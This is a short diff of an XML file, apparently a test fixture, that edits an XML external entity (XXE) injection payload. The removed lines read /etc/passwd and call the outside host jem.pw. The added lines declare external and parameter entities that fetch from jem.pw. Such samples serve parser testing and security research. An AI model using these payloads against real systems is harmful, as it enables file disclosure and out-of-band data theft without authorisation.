@@ -1,3 +1,5 @@
-<!ENTITY % file SYSTEM "filea:///etc/passwd">
-<!ENTITY xxe SYSTEM "https://jem.pw/">
-<root>&xxe;</root>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "https://jem.pw">
+  <!ENTITY xxe SYSTEM "https://jem.pw">
+  %file;
+]>
